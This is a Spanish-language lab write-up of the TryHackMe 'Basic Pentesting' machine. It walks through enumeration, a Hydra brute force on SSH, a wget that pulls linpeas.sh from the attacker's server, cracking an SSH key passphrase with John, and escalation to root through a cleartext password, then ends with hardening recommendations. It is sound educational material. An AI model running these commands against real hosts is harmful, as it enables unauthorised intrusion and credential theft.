# Basic Pentesting – Informe Profesional

## INDICE

- [1. Portada](#1-portada)  
- [2. Resumen Ejecutivo](#2-resumen-ejecutivo)  
- [3. Alcance](#3-alcance)  
- [4. Metodología](#4-metodología)  
- [5. Evidencias](#5-evidencias)  
- [6. Tabla de comandos](#6-tabla-de-comandos)  
- [7. MITRE ATT&CK](#7-mitre-attck)  
- [8. Conclusiones](#8-conclusiones)  
- [9. Recomendaciones](#9-recomendaciones)  
- [10. Deslinde de responsabilidad](#10-deslinde-de-responsabilidad)  

---

## 1. Portada

- **Título del reto:** Basic Pentesting  / Reto Nebula
- **Autor:** Mtro. Mitchell Correa - Alumno de Ciberseguridad  
- **Fecha:** 12/Nov/25  
- **Plataforma:** TryHackMe (THM) / Certificacion PMJ 
- **Nivel de confidencialidad:** EDUCATIVO  

---

## 2. Resumen Ejecutivo

En el laboratorio “Basic Pentesting” de la certificación "PMJ" de "HACKER MENTOR" se evaluó la seguridad de la máquina **10.201.50.161** siguiendo un flujo completo de pruebas de penetración.

Primero se verificó que el host estuviera activo y se identificó que corría **Linux/Unix** mediante análisis del TTL en las respuestas ICMP. Con **Nmap** se descubrieron varios servicios expuestos (SSH, Apache HTTP, Samba, Apache Tomcat, AJP) y se confirmaron sus detalles mediante un reporte HTML.

Posteriormente se realizó **enumeración web con DirBuster**, encontrando el directorio `/development/` y archivos accesibles. En paralelo, la **enumeración SMB con enum4linux** permitió identificar usuarios válidos como `jan`, `kay` y `ubuntu`.

Con esta información se lanzó un ataque de **fuerza bruta contra SSH con Hydra**, obteniendo las credenciales de `jan` y logrando acceso remoto por SSH. Desde esa sesión se ejecutó **LinPEAS** para buscar vectores de escalada de privilegios, hallando una clave privada `id_rsa` perteneciente al usuario `kay`.

Dicha clave estaba protegida con passphrase. Usando `ssh2john` y **John the Ripper**, se generó un hash y se crackeó la passphrase (`beeswax`). Esto permitió autenticarse por SSH como `kay`. Finalmente, en el home de `kay` se encontró el archivo `pass.bak` con una contraseña fuerte en texto plano, que se usó con `sudo su` para obtener privilegios **root** y leer la bandera final en `/root/flag.txt`.

El ejercicio demuestra cómo la combinación de **servicios expuestos, contraseñas débiles y mala gestión de credenciales** puede derivar en un compromiso total del sistema.

---

## 3. Alcance

**Activo objetivo**

| Elemento            | Detalle                                   |
|---------------------|-------------------------------------------|
| IP objetivo         | 10.201.50.161                             |
| Sistema operativo   | Ubuntu 20.04.6 LTS (Linux)                |
| Entorno             | Laboratorio educativo TryHackMe           |
| Rol del activo      | Servidor multi-servicio (web, SSH, SMB)   |

**Servicios identificados**

| Puerto | Servicio     | Producto      | Versión                       |
|--------|--------------|---------------|-------------------------------|
| 22/tcp | ssh          | OpenSSH       | 8.2p1 Ubuntu 4ubuntu0.13      |
| 80/tcp | http         | Apache httpd  | 2.4.41 (Ubuntu)               |
| 139/tcp| netbios-ssn  | Samba smbd    | 4                             |
| 445/tcp| netbios-ssn  | Samba smbd    | 4                             |
| 8009/tcp| ajp13       | Apache Jserv  | Protocolo v1.3                |
| 8080/tcp| http        | Apache Tomcat | 9.0.7                         |

**Herramientas utilizadas**

- `ping`, script bash (TTL)
- `nmap`
- `dirbuster`
- Navegador web
- `enum4linux`
- `hydra`
- `ssh`
- `wget`
- `linpeas.sh`
- `ssh2john`
- `john` (John the Ripper)

---

## 4. Metodología

1. **Reconocimiento**
   - Verificación de conectividad con ICMP.
   - Identificación aproximada de sistema operativo mediante TTL.

2. **Análisis de vulnerabilidades / Enumeración**
   - Escaneo de puertos, servicios y versiones con Nmap.
   - Generación y revisión de reportes (`.nmap`, `.xml`, `.html`).
   - Enumeración web con DirBuster.
   - Enumeración de usuarios y grupos con enum4linux.

3. **Explotación**
   - Ataque de fuerza bruta a SSH con Hydra contra el usuario `jan`.
   - Establecimiento de sesión SSH con credenciales válidas.

4. **Escalación de privilegios**
   - Enumeración interna del sistema (directorios, usuarios, ficheros sensibles).
   - Transferencia y ejecución de LinPEAS.
   - Hallazgo y extracción de la clave privada `id_rsa` de `kay`.
   - Cracking de la passphrase con ssh2john y John the Ripper.
   - Acceso SSH como `kay`.
   - Uso de la contraseña de `pass.bak` para `sudo su` y obtención de root.

5. **Banderas / Resultados**
   - Compromiso de usuarios `jan` y `kay`.
   - Compromiso de la cuenta `root`.
   - Lectura de la bandera final en `/root/flag.txt`.

---

## 5. Evidencias

> Cada evidencia incluye objetivo, comandos útiles, explicación técnica y una etiqueta sugerida para asociar la captura correspondiente.

---

### Evidencia 1 – PING al objetivo

**Objetivo:**  
Comprobar que la máquina 10.201.50.161 está activa y responde en la red.

**Comandos útiles:**
```bash
ping 10.201.50.161
```

**Qué hizo (técnico)**  
Se enviaron paquetes ICMP echo-request al host y se recibieron respuestas con `ttl=61`, confirmando conectividad y tiempos de respuesta estables. Esto valida que el objetivo está en línea y se puede continuar con escaneos más profundos.

**Evidencia sugerida:**  
FOTO 1: PING

---

### Evidencia 2 – Identificación de sistema operativo por TTL

**Objetivo:**  
Inferir el tipo de sistema operativo del objetivo (Linux/Windows/otro) para orientar los ataques.

**Comandos útiles:**
```bash
host="10.201.50.161"; t=$(ping -c1 -W1 "$host" 2>/dev/null | grep -oE "ttl=[0-9]+" | cut -d= -f2); \
if [ -z "$t" ]; then echo "Sin respuesta de $host"; \
elif [ "$t" -le 64 ]; then os="Unix/Linux (TTL base 64)"; \
elif [ "$t" -le 128 ]; then os="Windows (TTL base 128)"; \
else os="Router/Dispositivo de red (TTL base 255)"; fi; \
echo "$host -> TTL=$t -> $os"
```

**Qué hizo (técnico)**  
El script realiza un ping al host, extrae el valor de TTL de la respuesta ICMP y, según su rango, clasifica el sistema como Unix/Linux, Windows o dispositivo de red. El resultado `TTL=61` se interpretó como un sistema Unix/Linux, alineado con el resto de hallazgos.

**Evidencia sugerida:**  
FOTO 2: IDENTIFICACION DE SISTEMA OPERATIVO 

---

### Evidencia 3 – Escaneo de puertos (Nmap SYN Stealth)

**Objetivo:**  
Identificar qué puertos TCP comunes están abiertos en el objetivo.

**Comandos útiles:**
```bash
sudo nmap -sS -vvv -O -A -T4 10.201.50.161
```

**Qué hizo (técnico)**  
Se lanzó un escaneo SYN stealth contra los 1000 puertos TCP más comunes, habilitando detección de sistema operativo (`-O`) y scripts NSE (`-A`). Nmap confirmó que el host estaba activo e identificó varios puertos abiertos que luego se analizaron en detalle.

**Evidencia sugerida:**  
FOTO 3: ESCANEO DE PUERTOS 

---

### Evidencia 4 – Escaneo de versiones de puertos específicos

**Objetivo:**  
Obtener versiones exactas de los servicios expuestos en puertos de interés.

**Comandos útiles:**
```bash
sudo nmap -sV -p80,8080,445,139,22,8009 10.201.50.161 -T4 -vvv -oA Versiones_Puertos
```

**Qué hizo (técnico)**  
Nmap escaneó únicamente los puertos 22, 80, 139, 445, 8009 y 8080 con detección de versiones (`-sV`), guardando los resultados en varios formatos mediante `-oA Versiones_Puertos`. Se confirmaron servicios como OpenSSH, Apache, Samba, Apache Jserv y Tomcat.

**Evidencia sugerida:**  
FOTO 4: ESCANEO DE VERSIONES DE PUERTOS ESPECIFICOS

---

### Evidencia 5 – Comprobación de archivos de salida de Nmap

**Objetivo:**  
Verificar que Nmap generó correctamente los archivos de reporte para análisis posterior.

**Comandos útiles:**  
No se ejecuta un comando adicional relevante; se revisa gráficamente la presencia de:

- `Versiones_Puertos.gnmap`  
- `Versiones_Puertos.html`  
- `Versiones_Puertos.nmap`  
- `Versiones_Puertos.xml`

**Qué hizo (técnico)**  
Se comprobó en el sistema de archivos que Nmap había generado las salidas esperadas. Esto garantiza que el escaneo quedó documentado y puede reutilizarse para análisis manual o automatizado.

**Evidencia sugerida:**  
FOTO 5: COMPROBACION DE ARCHIVOS 

---

### Evidencia 6 – Reporte HTML de Nmap

**Objetivo:**  
Analizar de forma visual los resultados del escaneo de puertos y versiones.

**Comandos útiles:**  
Apertura del archivo `Versiones_Puertos.html` en un navegador web.

**Qué hizo (técnico)**  
Se visualizó el reporte HTML de Nmap donde se muestran los puertos abiertos, servicios, productos, versiones y detalles adicionales. Se confirmaron los servicios OpenSSH, Apache, Samba, Apache Jserv y Tomcat con sus versiones.

**Evidencia sugerida:**  
FOTO 6: REPORTE HTLM

---

### Evidencia 7 – Enumeración con DirBuster

**Objetivo:**  
Enumerar directorios y archivos ocultos en el servidor web.

**Comandos útiles:**
```bash
dirbuster
```

**Qué hizo (técnico)**  
Se lanzó DirBuster, configurando como objetivo `10.201.50.161` (puerto 80), con la wordlist `directory-list-2.3-small.txt`, brute force de directorios y archivos, y modo recursivo. Esto permitió detectar recursos web no enlazados de forma directa.

**Evidencia sugerida:**  
FOTO 7: ENUMERACION CON DIRBUSTER

---

### Evidencia 8 – Resultados del escaneo de DirBuster

**Objetivo:**  
Identificar rutas y archivos descubiertos por DirBuster que puedan contener información sensible.

**Comandos útiles:**  
No hay comandos adicionales; se revisa la pestaña de resultados de DirBuster.

**Qué hizo (técnico)**  
DirBuster encontró, entre otros, el directorio `/development/` y los archivos `/development/dev.txt` y `/development/j.txt`. Los códigos HTTP 200 confirman que son recursos accesibles.

**Evidencia sugerida:**  
FOTO 8: RESULTADOS DE ESCANEO 

---

### Evidencia 9 – Comprobación de rutas en `/development/`

**Objetivo:**  
Validar el acceso al directorio `/development/` desde el navegador y confirmación del listado de archivos.

**Comandos útiles:**  
Acceso mediante navegador a:
```text
http://10.201.50.161/development/
```

**Qué hizo (técnico)**  
El servidor Apache presentó un índice de directorio (`Index of /development`) que muestra los archivos `dev.txt` y `j.txt`. Esto confirma que el listado de directorios está habilitado en esa ruta.

**Evidencia sugerida:**  
FOTO 9: COMPROBACION DE RUTAS

---

### Evidencia 10 – Enumeración de red con enum4linux

**Objetivo:**  
Obtener información inicial sobre el servicio Samba: workgroup y cuentas genéricas.

**Comandos útiles:**
```bash
enum4linux 10.201.50.161
```

**Qué hizo (técnico)**  
Se ejecutó enum4linux contra la IP objetivo, obteniendo el nombre del grupo de trabajo (`WORKGROUP`) y listados de usuarios/grupos BUILTIN. Esta información prepara el contexto para un análisis más detallado de cuentas.

**Evidencia sugerida:**  
FOTO 10: ENUMERACION DE RED ENUM4LINUX

---

### Evidencia 11 – Enumeración avanzada de usuarios con enum4linux

**Objetivo:**  
Identificar usuarios Unix locales reales que puedan ser objetivo de autenticación.

**Comandos útiles:**
```bash
enum4linux 10.201.50.161
```

**Qué hizo (técnico)**  
En la salida se listan SIDs que corresponden a usuarios Unix locales: `kay`, `jan` y `ubuntu`. Esto confirma que dichas cuentas existen en el sistema y pueden utilizarse como vectores para ataques de credenciales.

**Evidencia sugerida:**  
FOTO 11: CONTINUACION DE Enum4linux 

---

### Evidencia 12 – Ataque de fuerza bruta a SSH con Hydra

**Objetivo:**  
Obtener la contraseña del usuario `jan` para el servicio SSH.

**Comandos útiles:**
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f -V ssh://10.201.50.161
```

**Qué hizo (técnico)**  
Hydra probó las contraseñas del diccionario `rockyou.txt` contra el servicio SSH del host, usando el usuario fijo `jan`. El ataque encontró el par válido `jan : armando`, lo que demuestra que la contraseña era débil y estaba incluida en un diccionario público.

**Evidencia sugerida:**  
FOTO 12 Y 13: HYDRA

---

### Evidencia 13 – Conexión SSH como `jan`

**Objetivo:**  
Validar las credenciales obtenidas y conseguir acceso interactivo al sistema.

**Comandos útiles:**
```bash
ssh jan@10.201.50.161
```

**Qué hizo (técnico)**  
Se estableció una sesión SSH satisfactoria como usuario `jan`. El sistema mostró el banner de Ubuntu 20.04.6 LTS y el prompt `jan@ip-10-201-50-161:~$`, confirmando el compromiso de la cuenta.

**Evidencia sugerida:**  
FOTO 14: CONECCION SSH 

---

### Evidencia 14 – Comprobación de privilegios y usuarios en `/home`

**Objetivo:**  
Enumerar directorios de usuarios y localizar archivos potencialmente sensibles, como historiales o ficheros de contraseñas.

**Comandos útiles:**
```bash
ls -lah
cd /home
ls -lah /home/kay/
cat /home/kay/pass.bak
cat /home/kay/.bash_history
```

**Qué hizo (técnico)**  
Desde la sesión de `jan` se listó el contenido de `/home` y en particular el directorio de `kay`. Se identificaron archivos interesantes como `pass.bak`, `.bash_history` y `.ssh/`. Algunos de ellos devolvieron `Permission denied` al intentar leerlos, lo que indica protección básica a nivel de permisos.

**Evidencia sugerida:**  
FOTO 15: COMPROBACION DE PRIVILEGIOS Y USUARIOS 

---

### Evidencia 15 – Descarga de LinPEAS para enumeración de PrivEsc

**Objetivo:**  
Transferir una herramienta de enumeración de escalada de privilegios al sistema objetivo.

**Comandos útiles:**
```bash
wget http://10.23.205.225:8080/Documentos/Nebula/xploit/linpeas.sh
```

**Qué hizo (técnico)**  
Desde `/dev/shm` en la máquina víctima se descargó el script `linpeas.sh` desde un servidor HTTP del atacante. La descarga se completó correctamente, quedando el script preparado para su ejecución.

**Evidencia sugerida:**  
FOTO 16 : Escalación de privilegios CON LinPEAS (descarga)

---

### Evidencia 16 – Ejecución de LinPEAS

**Objetivo:**  
Analizar la máquina comprometida para detectar vectores de escalada de privilegios.

**Comandos útiles:**
```bash
./linpeas.sh
```

**Qué hizo (técnico)**  
Se ejecutó LinPEAS, que revisó configuración del sistema, permisos, servicios, montajes, ficheros `.ssh`, tareas programadas, etc. Dentro de la salida se destacó la presencia de claves SSH y posibles archivos sensibles que podrían usarse para PrivEsc.

**Evidencia sugerida:**  
FOTO 17 : Escalación de privilegios CON LinPEAS (ejecución)

---

### Evidencia 17 – Hallazgo de clave privada RSA utilizada para autenticación SSH

**Objetivo:**  
Identificar una clave privada SSH (`id_rsa`) que pueda permitir autenticación como otro usuario.

**Comandos útiles:**  
Derivado de la ejecución de `./linpeas.sh` (no se ejecutó un comando adicional específico para listar el archivo).

**Qué hizo (técnico)**  
LinPEAS indicó la existencia del archivo `/home/kay/.ssh/id_rsa`, mostrando su contenido como una clave privada RSA. El comentario que acompañaba al archivo sugería que el usuario lo usaba para no escribir una contraseña larga.

**Evidencia sugerida:**  
FOTO 18: HALLAZGO RELEVANTE Clave privada RSA utilizada para autenticación SSH.

---

### Evidencia 18 – Extracción y resguardo de `id_rsa` (lado atacante)

**Objetivo:**  
Copiar la clave privada `id_rsa` al equipo del atacante y preparar su uso con SSH.

**Comandos útiles:**
```bash
chmod 600 id_rsa
```

**Qué hizo (técnico)**  
La clave privada fue guardada en el entorno del atacante y se ajustaron sus permisos a `600` para que el cliente SSH la aceptara como clave válida. Esto asegura que solo el usuario actual puede leerla y evita advertencias por permisos inseguros.

**Evidencia sugerida:**  
FOTO 19: Extracción y resguardo de Archivo id_rsa  
FOTO 20: PERMISOS

---

### Evidencia 19 – Confirmación de `/home/kay/.ssh/id_rsa` en la máquina víctima

**Objetivo:**  
Verificar directamente en el sistema objetivo la estructura del directorio `.ssh` de `kay`.

**Comandos útiles:**
```bash
pwd
cd /home/kay/
ls -lah
cd /home/kay/.ssh
ls -lah
```

**Qué hizo (técnico)**  
Se comprobó que en `/home/kay/.ssh` existen los archivos `authorized_keys`, `id_rsa` e `id_rsa.pub`. Esto confirma la presencia de una infraestructura SSH completa para ese usuario.

**Evidencia sugerida:**  
FOTO 21: Confirmación de id_rsa

---

### Evidencia 20 – Intento de autenticación SSH con `id_rsa` (clave cifrada)

**Objetivo:**  
Probar si la clave privada `id_rsa` permite autenticación directa como `kay`.

**Comandos útiles:**
```bash
ssh -i id_rsa kay@10.201.50.161
```

**Qué hizo (técnico)**  
Se intentó iniciar sesión SSH utilizando `id_rsa`. El sistema respondió solicitando la passphrase de la clave, confirmando que está cifrada y que no se puede usar sin conocer dicha passphrase.

**Evidencia sugerida:**  
FOTO 22: Intento de autenticación

---

### Evidencia 21 – Extracción del hash de la passphrase con ssh2john

**Objetivo:**  
Convertir la clave privada `id_rsa` a un formato de hash que John the Ripper pueda atacar.

**Comandos útiles:**
```bash
ssh2john id_rsa >> hashid.txt
```

**Qué hizo (técnico)**  
`ssh2john` procesó el archivo `id_rsa` y generó un hash de su passphrase, escribiéndolo en `hashid.txt`. Este archivo sirve como entrada para John the Ripper.

**Evidencia sugerida:**  
FOTO 23: Extracción del hash

---

### Evidencia 22 – Descifrado de la passphrase con John the Ripper

**Objetivo:**  
Recuperar la passphrase de la clave privada `id_rsa` mediante un ataque de diccionario.

**Comandos útiles:**
```bash
john hashid.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Qué hizo (técnico)**  
John the Ripper cargó el hash de `hashid.txt` y lo comparó con el diccionario `rockyou.txt`. El proceso encontró la passphrase `beeswax` asociada al identificador `id_rsa`, dejando la clave lista para ser utilizada.

**Evidencia sugerida:**  
FOTO 24: Descifrado de la passphrase  

---

### Evidencia 23 – Autenticación SSH como `kay` con `id_rsa`

**Objetivo:**  
Acceder al sistema objetivo como usuario `kay` usando la clave privada descifrada.

**Comandos útiles:**
```bash
ssh -i id_rsa kay@10.201.50.161
```

**Qué hizo (técnico)**  
Se ejecutó nuevamente la conexión SSH con `id_rsa`, introduciendo la passphrase `beeswax` cuando fue solicitada. La autenticación fue exitosa y se obtuvo el prompt `kay@ip-10-201-50-161:~$`.

**Evidencia sugerida:**  
FOTO 25: Autenticación SSH

---

### Evidencia 24 – Revisión del home de `kay` y lectura de `pass.bak`

**Objetivo:**  
Buscar contraseñas u otros datos sensibles en el directorio personal de `kay`.

**Comandos útiles:**
```bash
ls -lah
cat pass.bak
```

**Qué hizo (técnico)**  
Se listó el contenido de `/home/kay/` y se leyó el archivo `pass.bak`. El archivo contenía la contraseña:  
`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`  
Aunque la contraseña es robusta, su almacenamiento en texto plano la hace vulnerable.

**Evidencia sugerida:**  
FOTO 26: pass.bak

---

### Evidencia 25 – Escalada a root con `sudo su` usando la contraseña de `kay`

**Objetivo:**  
Aprovechar los permisos sudo de `kay` y la contraseña encontrada para obtener privilegios de superusuario.

**Comandos útiles:**
```bash
sudo su
```

**Qué hizo (técnico)**  
Se ejecutó `sudo su` y se introdujo la contraseña extraída del archivo `pass.bak`. El comando tuvo éxito y el prompt cambió a `root@ip-10-201-50-161:/home/kay#`, indicando control total sobre el sistema.

**Evidencia sugerida:**  
FOTO 27: Escalada a root 

---

### Evidencia 26 – Búsqueda de archivos sensibles y captura de la última bandera

**Objetivo:**  
Confirmar el compromiso total del sistema leyendo la bandera final como root.

**Comandos útiles:**
```bash
cd /root
ls
cat flag.txt
```

**Qué hizo (técnico)**  
Ya como root, se accedió al directorio `/root`, se listó su contenido y se leyó `flag.txt`. El archivo contenía el mensaje de finalización del reto, confirmando que se encontró la flag final y que se completó la máquina.

**Evidencia sugerida:**  
FOTO 28: archivos sensibles

---

## 6. Tabla de comandos

| # | Comando                                                                                                   | Descripción breve                                                |
|---|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------|
| 1 | `ping 10.201.50.161`                                                                                      | Verificar que el host objetivo está activo                       |
| 2 | Script TTL (Evidencia 2)                                                                                  | Inferir tipo de sistema operativo a partir del TTL               |
| 3 | `sudo nmap -sS -vvv -O -A -T4 10.201.50.161`                                                             | Escaneo general de puertos y sistema operativo                   |
| 4 | `sudo nmap -sV -p80,8080,445,139,22,8009 10.201.50.161 -T4 -vvv -oA Versiones_Puertos`                   | Detección de versiones en puertos específicos                    |
| 5 | `dirbuster`                                                                                               | Enumeración de directorios y archivos web                        |
| 6 | `enum4linux 10.201.50.161`                                                                                | Enumeración de usuarios y workgroup vía SMB                      |
| 7 | `hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f -V ssh://10.201.50.161`                       | Fuerza bruta contra SSH para el usuario `jan`                    |
| 8 | `ssh jan@10.201.50.161`                                                                                   | Acceso SSH como `jan`                                            |
| 9 | `ls -lah`, `cd /home`, `ls -lah /home/kay/`, `cat /home/kay/pass.bak`                                    | Enumeración de usuarios y archivos sensibles                     |
|10 | `wget http://10.23.205.225:8080/Documentos/Nebula/xploit/linpeas.sh`                                     | Transferir LinPEAS a la máquina víctima                          |
|11 | `./linpeas.sh`                                                                                            | Enumeración automática de vectores de escalada de privilegios    |
|12 | `chmod 600 id_rsa`                                                                                        | Ajustar permisos de la clave privada copiada                     |
|13 | `ssh -i id_rsa kay@10.201.50.161`                                                                         | Intento/acceso SSH usando la clave privada de `kay`              |
|14 | `ssh2john id_rsa >> hashid.txt`                                                                           | Convertir `id_rsa` a hash crackeable por John                    |
|15 | `john hashid.txt --wordlist=/usr/share/wordlists/rockyou.txt`                                            | Crackear la passphrase de la clave `id_rsa`                      |
|16 | `cat pass.bak`                                                                                            | Leer la contraseña fuerte almacenada en texto plano              |
|17 | `sudo su`                                                                                                 | Escalar a root usando la contraseña de `kay`                     |
|18 | `cd /root` / `ls` / `cat flag.txt`                                                                       | Localizar y leer la bandera final del reto                       |

---

## 7. MITRE ATT&CK

| Fase               | Táctica               | Técnica / Subtécnica                             | ID                     |
|--------------------|-----------------------|--------------------------------------------------|------------------------|
| Reconocimiento     | Reconnaissance        | Active Scanning (ICMP / Host Discovery)          | T1595 / T1595.001      |
| Enumeración        | Discovery             | Network Service Discovery (Nmap)                 | T1046                  |
| Enumeración web    | Discovery             | File and Directory Discovery (DirBuster, /dev)   | T1083                  |
| Enumeración SMB    | Discovery             | Account Discovery (enum4linux)                   | T1087.002              |
| Acceso credenciales| Credential Access     | Brute Force (Hydra sobre SSH)                    | T1110                  |
| Acceso credenciales| Credential Access     | Password Cracking (ssh2john + John)              | T1110.002              |
| Acceso credenciales| Credential Access     | Unsecured Credentials (ficheros y claves SSH)    | T1552.001 / T1552.004  |
| Acceso inicial     | Initial Access        | Valid Accounts (SSH con `jan` y `kay`)           | T1078                  |
| Descubrimiento int.| Discovery             | File and Directory Discovery (homes, `.ssh/`)    | T1083                  |
| PrivEsc            | Privilege Escalation  | Abuse Elevation Control Mechanism – sudo         | T1548.003              |
| Persistencia       | Persistence           | Valid Accounts (uso de claves SSH comprometidas) | T1078                  |
| Colección          | Collection            | Data from Local System (lectura de `flag.txt`)   | T1005                  |

---

## 8. Conclusiones

1. Se consiguió una **cadena completa de compromiso**, desde el reconocimiento externo hasta el acceso como root, usando herramientas conocidas y errores de configuración y operación.
2. La cuenta `jan` utilizaba una contraseña incluida en el diccionario `rockyou.txt`, lo que permitió un ataque de fuerza bruta exitoso con Hydra.
3. Aunque la clave privada `id_rsa` de `kay` estaba cifrada, su passphrase (`beeswax`) resultó lo suficientemente débil como para ser crackeada con John the Ripper.
4. El archivo `pass.bak` contenía una contraseña fuerte en texto plano. Esta práctica anuló la seguridad añadida por la complejidad de la contraseña y facilitó la escalada a root mediante `sudo su`.
5. La exposición de múltiples servicios (SSH, Apache, Samba, Tomcat) y directorios de desarrollo accesibles (`/development/`) aumentó la superficie de ataque y simplificó la labor de enumeración.
6. El laboratorio evidencia que **la enumeración constante es clave**: cada pieza de información (usuarios SMB, directorios, claves, archivos `.bak`) se aprovechó para avanzar al siguiente paso hasta alcanzar el máximo nivel de privilegios.

---

## 9. Recomendaciones

**Prioridad muy alta**

1. **Fortalecer políticas de contraseñas**
   - Incrementar longitud y complejidad mínima.
   - Bloquear cuentas temporalmente tras múltiples intentos fallidos.
   - Evitar contraseñas presentes en diccionarios comunes como `rockyou.txt`.

2. **Gestión adecuada de claves SSH**
   - Eliminar claves privadas antiguas o innecesarias (`id_rsa` de `kay`).
   - Exigir passphrases robustas que no aparezcan en diccionarios públicos.
   - Revisar y limitar los permisos de archivos en `~/.ssh/`.

3. **Eliminar contraseñas en texto plano**
   - Localizar y eliminar archivos como `pass.bak`.
   - Establecer políticas formales que prohíban almacenar credenciales sin cifrar.

4. **Revisar y limitar privilegios sudo**
   - Aplicar el principio de mínimo privilegio.
   - Sustituir `sudo su` por permisos concretos sobre comandos cuando sea posible.

**Prioridad alta**

1. **Endurecer servicios expuestos**
   - Mantener actualizados Apache, Samba, OpenSSH y Tomcat.
   - Deshabilitar servicios que no sean estrictamente necesarios.
   - Restringir acceso a puertos críticos (SSH, SMB) mediante firewall.

2. **Endurecimiento del servidor web**
   - Deshabilitar el listing de directorios (`Options -Indexes`).
   - Eliminar o proteger directorios de desarrollo como `/development/`.

3. **Monitoreo y respuesta**
   - Enviar logs de SSH, Apache y Samba a un SIEM.
   - Configurar alertas por:
     - Múltiples intentos fallidos de autenticación.
     - Descargas inusuales (p.ej., scripts de enumeración).
     - Uso de herramientas de cracking y patrones de comportamiento anómalos.

**Prioridad media/baja**

1. **Segmentación de entornos**
   - Separar claramente servidores de desarrollo, pruebas y producción.
   - Usar credenciales diferentes por entorno.

2. **Capacitación del personal**
   - Formar al personal técnico en buenas prácticas de hardening, gestión de claves y contraseñas.

3. **Pentesting periódico**
   - Realizar pruebas de penetración y laboratorios similares de forma periódica para validar que las medidas correctivas se mantienen.

---

## 10. Deslinde de responsabilidad

Este laboratorio se ha realizado en un entorno **controlado y autorizado (TryHackMe)** con fines exclusivamente **educativos y de formación en ciberseguridad**.

Las técnicas, comandos y procedimientos descritos en este documento **no deben utilizarse** contra sistemas de terceros sin autorización explícita de su propietario.  
El autor no se hace responsable del uso indebido de la información contenida en este archivo.

---
